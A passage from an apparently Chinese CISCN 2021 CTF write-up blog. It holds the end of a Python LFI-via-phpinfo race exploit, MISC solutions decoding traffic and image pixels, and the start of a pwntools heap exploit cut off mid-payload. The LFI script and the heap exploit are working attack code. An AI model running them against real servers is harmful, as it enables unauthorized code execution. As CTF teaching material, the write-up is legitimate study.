punctuation">,</span>fn<span class="token punctuation">)</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> s2<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    s2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span>tag<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>        <span class="token keyword">return</span> fncounter<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">class</span> <span class="token class-name">ThreadWorker</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> e<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>event <span class="token operator">=</span> e        self<span class="token punctuation">.</span>lock <span class="token operator">=</span>  l        self<span class="token punctuation">.</span>maxattempts <span class="token operator">=</span> m        self<span class="token punctuation">.</span>args <span class="token operator">=</span> args    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> counter        <span class="token keyword">while</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> self<span class="token punctuation">.</span>lock<span class="token punctuation">:</span>                <span class="token keyword">if</span> counter <span class="token operator">>=</span> self<span class="token punctuation">.</span>maxattempts<span class="token punctuation">:</span>                    <span class="token keyword">return</span>                counter<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                x <span class="token operator">=</span> phpInfoLFI<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>args<span class="token punctuation">)</span>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">break</span>                                <span class="token keyword">if</span> x<span class="token punctuation">:</span>                    <span class="token keyword">print</span> <span class="token string">"\nGot it!"</span>                    self<span class="token punctuation">.</span>event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>                <span class="token keyword">return</span>    <span class="token keyword">def</span> <span class="token function">getOffset</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Gets offset of tmp_name in the php output"""</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>        d <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>        d<span class="token operator">+=</span>i                <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token comment"># detect the final chunk</span>        <span class="token keyword">if</span> i<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"0\r\n\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"No php tmp_name in phpinfo output"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"found %s at %i"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>    <span class="token comment"># padded up a bit</span>    <span class="token keyword">return</span> i<span class="token operator">+</span><span class="token number">256</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"LFI With PHPInfo()"</span>    <span class="token keyword">print</span> <span class="token string">"-="</span> <span class="token operator">*</span> <span class="token number">30</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Usage: %s host [port] [threads]"</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with hostname %s: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    port<span class="token operator">=</span><span class="token number">80</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with port %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        poolsz<span class="token operator">=</span><span class="token number">10</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        poolsz <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with poolsz %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Getting initial offset..."</span><span class="token punctuation">,</span>      reqphp<span class="token punctuation">,</span> tag<span class="token punctuation">,</span> reqlfi <span class="token operator">=</span> setup<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>    offset <span class="token operator">=</span> getOffset<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    maxattempts <span class="token operator">=</span> <span class="token number">1000</span>    e <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    l <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Spawning worker pool (%d)..."</span> <span class="token operator">%</span> poolsz    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    tp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>poolsz<span class="token punctuation">)</span><span class="token punctuation">:</span>        tp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ThreadWorker<span class="token punctuation">(</span>e<span class="token punctuation">,</span>l<span class="token punctuation">,</span>maxattempts<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> reqlfi<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token keyword">not</span> e<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">with</span> l<span class="token punctuation">:</span>                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token string">"\r% 4d / % 4d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>counter<span class="token punctuation">,</span> maxattempts<span class="token punctuation">)</span><span class="token punctuation">)</span>                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> counter <span class="token operator">>=</span> maxattempts<span class="token punctuation">:</span>                    <span class="token keyword">break</span>        <span class="token keyword">print</span>        <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"Woot!  \m/"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">":("</span>    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"\nTelling threads to shutdown..."</span>        e<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"Shuttin' down..."</span>    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>跑出结果</p><img src="/article/ciscn2021/image-20210515181707458.png" class="" title="image-20210515181707458" loading="lazy"><img src="/article/ciscn2021/image-20210515182132566.png" class="" title="image-20210515182132566" loading="lazy"><img src="/article/ciscn2021/image-20210515182141809.png" class="" title="image-20210515182141809" loading="lazy"><img src="/article/ciscn2021/image-20210515182239294.png" class="" title="image-20210515182239294" loading="lazy"><img src="/article/ciscn2021/image-20210515182330338.png" class="" title="image-20210515182330338" loading="lazy"><img src="/article/ciscn2021/image-20210515182410646.png" class="" title="image-20210515182410646" loading="lazy"><img src="/article/ciscn2021/image-20210515183203380.png" class="" title="image-20210515183203380" loading="lazy"><p>flag位置：<code>/etc/ceffgbbgcd/chffbdjbag/cjdieddjcc/cajjfieifd/ajdfdccjdj/fl444444g</code></p><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;BmLDI-8WFso-KZGN9-XObp3-sjSOf-&#125;</code></pre><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny traffic"></a>tiny traffic</h3><p>流量包分析</p><img src="/article/ciscn2021/9CFC275D-3F65-48C5-A8BE-F9B67DDD610D.png" class="" title="9CFC275D-3F65-48C5-A8BE-F9B67DDD610D" loading="lazy"><p>发现三个关键部分</p><p>全部导出看看，解压<code>flag_wrapper</code>得到<code>CISCN&#123;&#125;</code></p><img src="/article/ciscn2021/image-20210516043809208.png" class="" title="image-20210516043809208" loading="lazy"><p>利用脚本解br发现proto3内容</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">import</span> brotli<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./test.br"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>content <span class="token operator">=</span> brotli<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span><span class="token string">"bw"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span></code></pre><img src="/article/ciscn2021/image-20210516052103002.png" class="" title="image-20210516052103002" loading="lazy"><p>导出<code>secret</code>内容如下</p><img src="/article/ciscn2021/image-20210516052229144.png" class="" title="image-20210516052229144" loading="lazy"><p>由此应该是用proto3协议来解密</p><p>根据教程<a href="https://www.cnblogs.com/luoxn28/p/5303517.html">https://www.cnblogs.com/luoxn28/p/5303517.html</a></p><p>安装环境后用其自带的decode方法，用test文件规定的解密规则将处理过的<code>secret</code>进行解密</p><img src="/article/ciscn2021/image-20210516054849721.png" class="" title="image-20210516054849721" loading="lazy"><p>有用的部分在<code>PBResponse</code></p><p>最后拼接flag</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">15100450</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"e2345"</span><span class="token operator">+</span><span class="token string">"7889b0"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">16453958</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"d172a38dc"</span></code></pre><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;e66a22e23457889b0fb1146d172a38dc&#125;</code></pre><hr><h3 id="running-pixel"><a href="#running-pixel" class="headerlink" title="running_pixel"></a>running_pixel</h3><p>下载为gif，Photoshop打开发现有几百帧，仔细观察发现每帧上有奇怪像素点，RGB值为(233,233,233)</p><img src="/article/ciscn2021/image-20210516045206693.png" class="" title="image-20210516045206693" loading="lazy"><p>利用convert进行抽帧</p><pre class="language-sh" data-language="sh"><code class="language-sh">convert .&#x2F;running_pixel.gif .&#x2F;output&#x2F;out%05d.png</code></pre><p>把每张图RGB(233,233,233)像素的坐标提取出来放文档里</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">import</span> ospath <span class="token operator">=</span> <span class="token string">"./output/"</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagewidth <span class="token operator">=</span> <span class="token number">400</span>height <span class="token operator">=</span> <span class="token number">400</span><span class="token keyword">def</span> <span class="token function">get_rgb</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>    pixel <span class="token operator">=</span> img<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>    coordinates <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    out_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./list.txt"</span><span class="token punctuation">,</span> <span class="token string">"a+"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>            r<span class="token punctuation">,</span> g <span class="token punctuation">,</span>b <span class="token operator">=</span> pixel<span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span>            <span class="token keyword">if</span> r <span class="token operator">==</span> g <span class="token operator">==</span> b <span class="token operator">==</span> <span class="token number">233</span><span class="token punctuation">:</span>                coordinate <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span>                out_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>coordinate <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>                <span class="token comment"># print(r, g, b)</span>    <span class="token keyword">return</span> coordinates  <span class="token keyword">def</span> <span class="token function">get_files</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    img <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>path <span class="token operator">+</span> <span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> img  <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> pic_file <span class="token keyword">in</span> files<span class="token punctuation">:</span>        pic <span class="token operator">=</span> get_files<span class="token punctuation">(</span>pic_file<span class="token punctuation">)</span>        coors <span class="token operator">=</span> get_rgb<span class="token punctuation">(</span>pic<span class="token punctuation">)</span></code></pre><p>得到所有像素点后画图，使用现成脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> ImageDrawflag_image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'list.txt'</span><span class="token punctuation">)</span>draw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>flag_image<span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    point <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag_image<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag_image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"./flag.png"</span><span class="token punctuation">)</span></code></pre><p>得到如下图</p><img src="/article/ciscn2021/image-20210516051514950.png" class="" title="image-20210516051514950" loading="lazy"><p>纯手动一点一点慢慢拼出了flag</p><img src="/article/ciscn2021/image-20210515184657362.png" class="" title="image-20210515184657362" loading="lazy"><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;12504d0f-9de1-4b00-87a5-a5fdd0986a00&#125;</code></pre><h3 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h3><p><code>strings cap.pcapng</code>可以看到有坐标轴，坐标轴为三维坐标，但由于z轴大多数为0，所以可以用二维画图，</p><img src="/article/ciscn2021/image-20210517144021953.png" class="" title="image-20210517144021953" loading="lazy"><p>直接用上面的脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> ImageDrawflag_image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'zuobiao.txt'</span><span class="token punctuation">)</span>draw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>flag_image<span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    point <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>    flag_image<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag_image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"./flag.png"</span><span class="token punctuation">)</span></code></pre><p>得到图片：</p><img src="/article/ciscn2021/image-20210517144052457.png" class="" title="image-20210517144052457" loading="lazy"><p>md5加密之后就得到flag：CISCN{d4f1fb80bc11ffd722861367747c0f10}</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="longlywolf"><a href="#longlywolf" class="headerlink" title="longlywolf"></a>longlywolf</h3><p>exp：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> base64context<span class="token punctuation">.</span>os <span class="token operator">=</span> <span class="token string">'linux'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./lonelywolf'</span><span class="token punctuation">)</span><span class="token comment">#p = remote('127.0.0.1',12345)</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./lonelywolf'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> binary<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token 